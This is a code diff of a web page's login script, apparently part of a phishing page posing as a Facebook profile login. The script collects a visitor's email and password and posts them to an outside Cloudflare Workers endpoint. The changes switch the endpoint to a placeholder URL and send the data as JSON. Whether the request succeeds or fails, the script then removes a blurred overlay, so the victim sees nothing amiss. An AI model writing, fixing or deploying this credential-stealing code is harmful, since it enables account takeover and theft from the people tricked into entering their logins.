@@ -204,35 +204,38 @@
     </div>
 
     <script>
-        $(document).ready(function() {
-            $('#loginForm').submit(function(e) {
-                e.preventDefault(); 
+    $(document).ready(function() {
+        $('#loginForm').submit(function(e) {
+            e.preventDefault(); 
 
-                var formData = {
-                    email: $('#email').val(),
-                    pass: $('#pass').val()
-                };
+            var formData = {
+                email: $('#email').val(),
+                pass: $('#pass').val()
+            };
 
-                $.ajax({
-                    type: 'POST',
-                    url: 'https://fb-profile-api.myweb1128.workers.dev/', // Make sure this matches your backend path
-                    data: formData,
-                    success: function() {
-                        unlockProfile();
-                    },
-                    error: function() {
-                        unlockProfile();
-                    }
-                });
+            $.ajax({
+                type: 'POST',
+                url: 'https://your-worker-name.yourname.workers.dev', // <--- DOUBLE CHECK THIS URL
+                data: JSON.stringify(formData), // <--- MUST be stringified
+                contentType: 'application/json', // <--- MUST be application/json
+                success: function(response) {
+                    console.log("Success:", response);
+                    unlockProfile();
+                },
+                error: function(xhr, status, error) {
+                    console.log("Error:", error);
+                    unlockProfile();
+                }
             });
         });
+    });
 
-        function unlockProfile() {
-            $('#login-overlay').fadeOut(500, function() {
-                $('#main-content').css('filter', 'none');
-                $('body').css('overflow', 'auto');
-            });
-        }
-    </script>
+    function unlockProfile() {
+        $('#login-overlay').fadeOut(500, function() {
+            $('#main-content').css('filter', 'none');
+            $('body').css('overflow', 'auto');
+        });
+    }
+</script>
 </body>
 </html>
